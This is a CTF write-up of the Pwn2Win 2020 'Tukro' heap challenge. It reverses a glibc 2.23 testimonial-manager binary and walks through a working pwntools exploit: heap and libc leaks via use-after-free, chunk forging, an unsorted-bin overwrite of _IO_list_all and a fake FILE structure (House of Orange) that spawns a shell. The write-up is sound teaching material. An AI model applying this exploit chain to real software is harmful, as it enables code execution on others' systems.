---
layout: "post"
title: "Pwn2Win 2020 Tukro Writeup"
date: 2020-6-01
tags: [Heap,House of Orange, UAF, CTF]
---

Yet another challenge which I spent my time on in this weekend's Pwn2Win CTF.

## TL;DR of The Challenge Binary

We've been given Libc 2.23 along with the `x86 64-bit Dynamically Linked` executable.

Let us start reversing without any further delay.

## REVERSING

To begin with , we land in a small Menu Driven code which has two options , *sign_in* and *sign_up*.

* *sign_up*
    1. We have a user limit of **3**.
    2. The function takes 16 bytes of user input for **Username** and **Password** and checks if both username and Password are of length atleast **4 bytes**.
    3. Then , it checks whether the **username** already exists and if not , it stores the username and password on bss.

```c
  if ( dword_20304C > 3 )
  {
    puts("The user list is full!");
  }
  else
  {
    memset(&s, 0, 0x10uLL);
    memset(&buf, 0, 0x10uLL);
    puts("-----------------------------------------");
    printf("Username: ", 0LL);
    read(0, &s, 0x10uLL);
    printf("Password: ", &s);
    read(0, &buf, 0x10uLL);
    if ( strlen(&s) <= 3 || strlen(&buf) <= 3 )
    {
      puts("The username and password");
      puts("must be at least 4 characters!");
    }
    else
    {
      for ( i = 0; i < dword_20304C; ++i )
      {
        if ( !strcmp(&s, &unk_203060 + 200 * i) )
        {
          puts("User already registered!");
          return 0xFFFFFFFFLL;
        }
      }
      v1 = (&unk_203060 + 200 * dword_20304C);
      v2 = v8;
      *v1 = s;
      v1[1] = v2;
      v3 = (&unk_203060 + 200 * dword_20304C + 16);
      v4 = v10;
      *v3 = buf;
      v3[1] = v4;
      v5 = dword_20304C++;
      dword_203080[50 * v5] = 0;
    }
  }
  return 0LL;

```

* *sign_in*
    1. Asks for username and password , checks if the username already exists on the bss table or not.
    2. If yes , then it takes us to another *Testimonial_Menu*.

Let us explore and see what the *testimonial_menu* has in store for us.

* *Write_Testimonial*
    1. Takes in *user_name* , checks if it exists and then sets *user_idx* to the index of the user requested.
    2. Checks if the number of testimonials present exceed **9**.
    3. Else , It mallocs a chunk of size **0x500** , reads in 0x500 bytes.
    4. Stores the malloc pointer onto the corresponding user_name section of bss.
    5. It also increments the next 8 bytes of memory after storing the malloc pointer.

There's one more thing to this , you can add testimonials only to the users apart from the one you are signed in from.
{: .notice}

For instance , I have added 8 testimonials and this is how bss section corresponding to the user_name specified looks like.

```sh

0024| 0x555555757128 --> 0xa646e6f636573 ('second\n') The username that I gave to add was second.
0032| 0x555555757130 --> 0x0 
0040| 0x555555757138 --> 0xa646e6f636573 ('second\n')
0048| 0x555555757140 --> 0x0 
0056| 0x555555757148 --> 0x8 
0064| 0x555555757150 --> 0x555555758010 --> 0xa61616161 ('aaaa\n')
0072| 0x555555757158 --> 0x1 
0080| 0x555555757160 --> 0x555555758520 --> 0xa62626262 ('bbbb\n')
0088| 0x555555757168 --> 0x1 
0096| 0x555555757170 --> 0x555555758a30 --> 0xa63636363 ('cccc\n')
0104| 0x555555757178 --> 0x1 
0112| 0x555555757180 --> 0x555555758f40 --> 0xa64646464 ('dddd\n')
0120| 0x555555757188 --> 0x1 
0128| 0x555555757190 --> 0x555555759450 --> 0xa65656565 ('eeee\n')
0136| 0x555555757198 --> 0x1 
0144| 0x5555557571a0 --> 0x555555759960 --> 0xa66666666 ('ffff\n')
0152| 0x5555557571a8 --> 0x1 
0160| 0x5555557571b0 --> 0x555555759e70 --> 0xa67676767 ('gggg\n')
0168| 0x5555557571b8 --> 0x1 
0176| 0x5555557571c0 --> 0x55555575a380 --> 0xa68686868 ('hhhh\n')
0184| 0x5555557571c8 --> 0x1 
0192| 0x5555557571d0 --> 0x0 
0200| 0x5555557571d8 --> 0x0 
0208| 0x5555557571e0 --> 0x0 
0216| 0x5555557571e8 --> 0x0 
0224| 0x5555557571f0 --> 0xa6472696874 ('third\n')
0232| 0x5555557571f8 --> 0x0 
0240| 0x555555757200 --> 0xa6472696874 ('third\n')

```
Here goes the decompilation.

```c
 user_idx = -1;
  printf("Recipient Username: ");
  v1 = &buf;
  read(0, &buf, 0x10uLL);
  if ( strlen(&buf) > 3 )
  {
    v1 = &unk_203060 + 200 * a1;
    if ( strcmp(&buf, v1) )
    {
      for ( i = 0; i < dword_20304C; ++i )
      {
        v1 = &unk_203060 + 200 * i;
        if ( !strcmp(&buf, v1) )
        {
          user_idx = i;
          break;
        }
      }
    }
  }
  if ( user_idx < 0 )
  {
    puts("User Not Found!");
    result = 0xFFFFFFFFLL;
  }
  else if ( dword_203080[50 * user_idx] > 9 )
  {
    puts("The user cannot receive new testimonials");
    result = 0xFFFFFFFFLL;
  }
  else
  {
    printf("Testimonial: ", v1);
    v2 = malloc(0x500uLL);
    read(0, v2, 0x500uLL);
    *(&unk_203068 + 25 * user_idx + 2 * (dword_203080[50 * user_idx] + 2LL)) = v2;
    *(&unk_203074 + 50 * user_idx + 4 * (dword_203080[50 * user_idx] + 2LL)) = a1;
    v3 = dword_203080[50 * user_idx];
    dword_203080[50 * user_idx] = v3 + 1;
    *(&unk_203070 + 50 * user_idx + 4 * (v3 + 2LL)) = user_idx;
    result = 0LL;
  }
  return result;

```

* *View_All* ->
    1. Views all the data of each chunk.

* Edit ->
    1. Prints each testimonial
    2. Asks for editing a testimonial at a given idx.
    3. Then reads in 0x500 bytes of data into the requested testimonial.

```c
  for ( i = 0; i <= 3; ++i )
  {
    for ( j = 0; j <= 9; ++j )
    {
      if ( a1 == *(&unk_203074 + 50 * i + 4 * (j + 2LL)) && *(&unk_203068 + 25 * i + 2 * (j + 2LL)) )
      {
        v1 = v8++;
        v13[v1] = &unk_203060 + 200 * i + 16 * (j + 2LL) + 8;
        puts(&byte_21C9);
        printf("Testimonial %d: ", v8);
        for ( k = 0; k <= 31; ++k )
        {
          v2 = (40 * k + *v13[v8 - 1]);
          v3 = v2[1];
          *s = *v2;
          v16 = v3;
          v4 = v2[3];
          v17 = v2[2];
          v18 = v4;
          v19 = v2[4];
          if ( !s[0] )
            break;
          puts(&byte_21C9);
          v5 = strlen(s);
          write(1, s, v5);
        }
      }
    }
  }
  if ( v8 <= 0 )
  {
    puts("You haven't written a testimonial yet");
  }
  else
  {
    printf("\nEdit Testimonial (y/N): ");
    read(0, &buf, 8uLL);
    if ( buf == 89 || buf == 121 )
    {
      printf("Testimonial Number: ", &buf);
      read(0, &buf, 8uLL);
      v12 = atoi(&buf);
      if ( v12 <= 0 || v12 > v8 )
      {
        puts("Not found");
      }
      else
      {
        printf("New Testimonial: ", &buf);
        memset(v20, 0, 0x500uLL);
        read(0, v20, 0x500uLL);
        v6 = *v13[v12 - 1];
        *v6 = *v20;
        v6[159] = v21;
        qmemcpy(
          ((v6 + 1) & 0xFFFFFFFFFFFFFFF8LL),
          (v20 - (v6 - ((v6 + 1) & 0xFFFFFFFFFFFFFFF8LL))),
          8LL * (((v6 - ((v6 + 8) & 0xFFFFFFF8) + 1280) & 0xFFFFFFF8) >> 3));
      }
    }
  }
```

* *Delete* ->
    1. Frees the chunk at requested idx without nulling out the pointer , hence we have **Use After Free**.
    2. After freeing , it shifts all the testimonials and overwrites the data of the freed chunk.

```c
  if ( dword_203080[50 * a1] )
  {
    printf("Testimonial Number: ");
    read(0, &buf, 8uLL);
    v8 = atoi(&buf);
    if ( v8 <= 0 || v8 > dword_203080[50 * a1] )
    {
      puts("Not found");
    }
    else if ( v8 == dword_203080[50 * a1] )
    {
      free(*(&unk_203068 + 25 * a1 + 2 * (--dword_203080[50 * a1] + 2LL)));
    }
    else
    {
      v1 = 16 * (v8 - 1 + 2LL) + 200LL * a1;
      v9 = *(&unk_203060 + v1 + 8);
      v10 = *(&unk_203060 + v1 + 16);
      for ( i = v8; i <= dword_203080[50 * a1]; ++i )
      {
        v2 = &unk_203060 + 200 * a1 + 16 * (i - 1 + 2LL);
        v3 = &unk_203060 + 200 * a1 + 16 * (i + 2LL);
        v4 = *(v3 + 2);
        *(v2 + 1) = *(v3 + 1);
        *(v2 + 2) = v4;
      }
      v5 = &unk_203060 + 200 * a1 + 16 * (--dword_203080[50 * a1] + 2LL);
      *(v5 + 1) = v9;
      *(v5 + 2) = v10;
      free(*(&unk_203068 + 25 * a1 + 2 * (dword_203080[50 * a1] + 2LL)));
    }
  }
  else
  {
    puts("You don't have a testimonial yet");
  }
```

Hey wait , doesn't this for loop look a little more fishy to you?

```c
for ( i = v8; i <= dword_203080[50 * a1]; ++i )

```

The iterations happen for *dword_203080[50 * a1] + 1* times. Let's see how we can use this.

We have the bugs , heading on to exploit this.

## Exploit Development and Analysis

Getting leaks shouldn't be a herculean task , so let's go with it without further blabbering.

First we allocate 3 users , sign in to first user and allocate 8 chunks into second user's bss space.

```py
from pwn import *
import sys

libc = ELF("./libc.so.6",checksec=False)
if(len(sys.argv)>1):
    io=remote('tukro.pwn2.win',1337)
    context.noptrace = True
else:
    io = process("./tukro",env = {"LD_PRELOAD" : "./libc.so.6"})

def sign_up(user,passw):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Username: ",str(user))
    io.sendlineafter("Password: ",str(passw))

def sign_in(user,passw):
    io.sendlineafter("Your choice: ","2")
    io.sendlineafter("Username: ",str(user))
    io.sendlineafter("Password: ",str(passw))


def add(recp,test):
    io.sendlineafter("Your choice: ","1")
    io.sendlineafter("Recipient Username: ",str(recp))
    io.sendlineafter("Testimonial: ",str(test))

def my_test():
    io.sendlineafter("Your choice: ","2")

def edit(choice,number,data):
    io.sendlineafter("Your choice: ","3")
    io.recvuntil("Edit Testimonial (y/N): ")
    io.sendline(choice)
    if(choice == "y"):
        io.sendlineafter("Testimonial Number: ",str(number))
        io.sendlineafter("New Testimonial: ",data)

def delete(number):
    io.sendlineafter("Your choice: ","4")
    io.sendlineafter("Testimonial Number: ",str(number))

def sign_out():
    io.sendlineafter("Your choice: ","5")


if __name__ == "__main__":
    sign_up("first_user","first_user")
    sign_up("second","second")
    sign_up("third","third")
    sign_in("first_user","first_user")
    for i in xrange(8):
        add("second",str(chr(ord('a') + i))*4)
    gdb.attach(io)
    io.interactive()

```

Now we *sign_in* from second user and delete first 3 chunks.

```py
    sign_out()
    sign_in("second","second")
    delete(1)
    delete(2)
    delete(3)
    sign_out()

```

Finally sign in from the first user and invoke the edit functionality which prints the contents of all testimonials of all users.

```py
    sign_in("first_user","first_user")

    #Leaks
    leaks = edit('N',0,"")
    string1 = leaks.split("\n")[-2]
    string2 = leaks.split("\n")[-5]
    libc_base = u64(string1 +"\x00"*2)- 0x3c4b78
    heap_base = u64(string2+"\x00"*2) - 0xa20
    log.info("Libc, Heap @ "+ hex(libc_base) + " : " + hex(heap_base))
    gdb.attach(io)
    io.interactive()

```

Now that we have the necessary leaks , and we can edit free chunks , the first idea that came into light was **Unsorted Bin Attack** by overwriting **global\_max\_fast** pointer in libc bss to make large sizes appear as fastbin sizes to malloc.

But there was an issue of size , it was fixed to 0x500 and for a successful attack with fastbin , we need to have this size somehow near a region like **\__malloc\_hook** or **free\_hook** but we found none. We also tried with exit pointers in libc bss but with no luck.

Hence the only idea that was left worth trying was overwriting the **IO\_list\_all** pointer to invoke **House Of Orange** attack.

Let's have a look at the procedure in which we can trigger **HOO**.

* When malloc detects an error in the linked lists, like a corrupted fd and bk pointers, it aborts and calls a function **\_IO\_flush\_all\_lockp**.

* This function is used to close all the file pointers such as stdout, stderr etc.

* It does the same by using a global pointer called **\_IO\_list\_all** that contains the pointer to the stdout/stderr file pointer.

* The file pointer structures contain a pointer to the next file pointer. The function uses this to iteratively close all the file pointers used.

* Now, these file pointers have jump tables that are used if some pre-conditions are met.

* So, the idea is to overwrite the **\_IO\_list\_all** pointer and point it to a location we control.

We overwrite the **\IO\_list\_all** with a pointer to the main_arena.

* By correctly setting the size of the chunk in the free list, we can make sure that the next file pointer accessed will be the chunk in the free list.

* So, in order to overwrite the **\_IO\_list\_all** with a pointer to the main_arena, we use the unlink vulnerability.

When a chunk in the free list is to be splitted off to service a malloc request, the code that gets executed is as follows

```c
unsorted_chunks (av)->bk = bck;
bck->fd = unsorted_chunks (av);

```

So, the fd pointer of previous chunk get’s overwritten with an address in the main_arena.

If we set the previous chunk to be **\_IO\_list\_all – 0x10**, then **bck->fd** will be the **\_IO\_list\_all** pointer.

In brief , all we need to do is

1. Corrupt bck pointer of free chunk to point to **\_IO\_list\_all – 0x10**.

2. Set size of chunk such that the second file pointer accessed is under users control. (**0x61** is one such value)

So now the problem is we dont have control over size of the chunk we allocate , and hence in this case , we need to create overlapping chunks in such a way that we get control over size , fd and bk of a free chunk.

At this point , we have 3 chunks in free list , 2 of which are in unsorted bin.

```sh
0000| 0x564dac5fd150 --> 0x564dacc41520 --> 0xa62626262 ('bbbb\n')
0008| 0x564dac5fd158 --> 0x1 
0016| 0x564dac5fd160 --> 0x564dacc41f40 --> 0xa64646464 ('dddd\n')
0024| 0x564dac5fd168 --> 0x1 
0032| 0x564dac5fd170 --> 0x564dacc42960 --> 0xa66666666 ('ffff\n')
0040| 0x564dac5fd178 --> 0x1 
0048| 0x564dac5fd180 --> 0x564dacc42e70 --> 0xa67676767 ('gggg\n')
0056| 0x564dac5fd188 --> 0x1 
0064| 0x564dac5fd190 --> 0x564dacc43380 --> 0xa68686868 ('hhhh\n')
0072| 0x564dac5fd198 --> 0x1 
0080| 0x564dac5fd1a0 --> 0x564dacc42450 --> 0x564dacc41a20 --> 0x0  -> This is in unsorted bin
0088| 0x564dac5fd1a8 --> 0x1 
0096| 0x564dac5fd1b0 --> 0x564dacc41a30 --> 0x564dacc41000 --> 0x0  -> we edit this chunk's fd to our fake chunk
0104| 0x564dac5fd1b8 --> 0x1 
0112| 0x564dac5fd1c0 --> 0x564dacc41010 --> 0x7f0e3ab4bb78 --> 0x564dacc43880 --> 0x0 -> This is also in unsorted bin
0120| 0x564dac5fd1c8 --> 0x1 

```
Let's script what we desire

```py

    IO_list  = libc_base + libc.symbols['_IO_list_all']
    bk = heap_base + 0x1960
    fd = heap_base + 0x1440 - 0x8
    edit('y',7,p64(fd) + p64(bk))
    gdb.attach(io)

```

And see how the chunks look like ->

```sh
0000| 0x561a4bb48150 --> 0x561a4d2e4520 --> 0xa62626262 ('bbbb\n')
0008| 0x561a4bb48158 --> 0x1 
0016| 0x561a4bb48160 --> 0x561a4d2e4f40 --> 0xa64646464 ('dddd\n')
0024| 0x561a4bb48168 --> 0x1 
0032| 0x561a4bb48170 --> 0x561a4d2e5960 --> 0xa66666666 ('ffff\n')                   -> This is chunk 3 , our supposed fake chunk
0040| 0x561a4bb48178 --> 0x1 
0048| 0x561a4bb48180 --> 0x561a4d2e5e70 --> 0xa67676767 ('gggg\n')
0056| 0x561a4bb48188 --> 0x1 
0064| 0x561a4bb48190 --> 0x561a4d2e6380 --> 0xa68686868 ('hhhh\n')
0072| 0x561a4bb48198 --> 0x1 
0080| 0x561a4bb481a0 --> 0x561a4d2e5450 --> 0x561a4d2e4a20 --> 0x0 
0088| 0x561a4bb481a8 --> 0x1 
0096| 0x561a4bb481b0 --> 0x561a4d2e4a30 --> 0x561a4d2e5960 --> 0xa66666666 ('ffff\n') -> Clean , we overwrote fd with chunk 3's addr
0104| 0x561a4bb481b8 --> 0x1 
0112| 0x561a4bb481c0 --> 0x561a4d2e4010 --> 0x7fdc8f575b78 --> 0x561a4d2e6880 --> 0x0 

```

Now we edit chunk 3 and fake our chunk there.

We create our fake chunk in our chunk 3 , so that we can overwrite the size of the next chunk.

```py

    bk = IO_list - 0x10
    fd = heap_base + 0xa20
    edit('y',3,p64(0) + p64(0x511) + p64(fd) + p64(bk))
    gdb.attach(io)

```

Let's see how chunk 3 looks like now.

```sh

0x561a3e08d950:	0x0000000000000510	0x0000000000000510 
0x561a3e08d960:	0x0000000000000000	0x0000000000000511 -> Fake chunk header
0x561a3e08d970:	0x0000561a3e08ca20	0x00007fc7d9e04510 -> fd and bk set appropriately
0x561a3e08d980:	0x000000000000000a	0x0000000000000000

```

Well , its time to trigger overwrite of **IO\_list\_all** pointer by mallocing 2 chunks.

The third call to malloc should return our fake chunk.

```py
    #Get stuff back from unsorted bin
    add("third","aaaa")
    add("third","bbbb")
    #Finally get back our fake chunk and overwrite the size of the next chunk with 0x91
    payload = 'f'*8 + p64(0)*(0x500-0x8)/8 + p64(0) + p64(0x91)
    add("third",payload)

```

With this , we successfully faked the size of a valid chunk.

```sh
0x555555759e60:	0x0000000000000000	0x0000000000000091
0x555555759e70:	0x0000000a67676767	0x0000000000000001

```

Looks like our fake chunk is in second user's area. We sign_out and sign_in back into second user.

We free the 0x91 chunk now. 

```py
    sign_out()
    sign_in("second","second")
    delete(4) 

```

Cool , its a part of unsorted bin now.

```sh

0x555555759e60:	0x0000000000000000	0x0000000000000091
0x555555759e70:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
0x555555759e80:	0x0000000000000000	0x0000000000000000

$1 = {
  mutex = 0x0,
  flags = 0x1,
  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
  top = 0x55555575a880,
  last_remainder = 0x0,
  bins = {0x555555759e60, 0x555555759e60,......}

```

The aim is to get a 0x61 sized unsorted bin for easy IO_list_all overwrite.

For that , we need to do some additional work , we sign back in to first user and edit the chunk above our fake chunk to make it's size 0x61 this time.

```py
    
    sign_out()
    sign_in("first_user","first_user")
    payload = "llll"+"\x00"*1260 + "/bin/sh\x00" + p64(0x61)
    edit('y',11,payload)  #our fake chunk is first_user's 11th chunk 

```

But how come we can access our fake chunk from 11th offset , there are only 10 testimonials per user right?

The answer is that fishy for loop range we saw previously is helping us achieve this.

```c

for ( i = v8; i <= dword_555555757080[50 * a1]; ++i )

```

Finally we edit our fake chunk with the file structure that satisfies the constraints of calling **system("/bin/sh")** from malloc abort.

```py

    addr = heap_base + 0x1f30
    vtable = heap_base + 0x1f58
    system = libc_base + libc.symbols['system']
    payload = p64(0xdeadbeef) + p64(IO_list- 0x10)
    payload += p64(0)*16 + p64(addr)
    payload += p64(0)*3 +p64(1) +p64(0)*2
    payload += p64(vtable) + p64(1)+p64(2)+p64(3)+ p64(0)*3 + p64(system)
    gdb.attach(io)
    edit('y',5,payload)

```

Next malloc call should definitely overwrite **\_IO\_list\_all** and subsequently abort also , thus giving us shell.

```sh
   0x7ffff7a8ee0c <_int_malloc+652>:	mov    QWORD PTR [rbx+0x70],r15
   0x7ffff7a8ee10 <_int_malloc+656>:	mov    QWORD PTR [r15+0x10],r12

```
r15 was the fd which was IO_list-0x10 , and that is overwritten with r12 which is the pointer to top chunk in main_arena.

Now while closing the file structures , in the linked list , **IO\_flushall\_lockp** will be fooled to see our fake file structure and thus give us shell.

On the very next malloc , we get our sweet shell.

```py

add("third","shell")

```

## CONCLUSION

Awesome challenge , Awesome Idea , kudos to team pwn2win for such a beautiful challenge.

Here's the complete [Script](https://gist.github.com/PwnVerse/96c30d61ac33d692c04074157d033c31)

### References

* [JayKrishna Menon's Blog](https://jkrshnmenon.wordpress.com/2017/08/30/hitcon-2016-house-of-orange-writeup/)
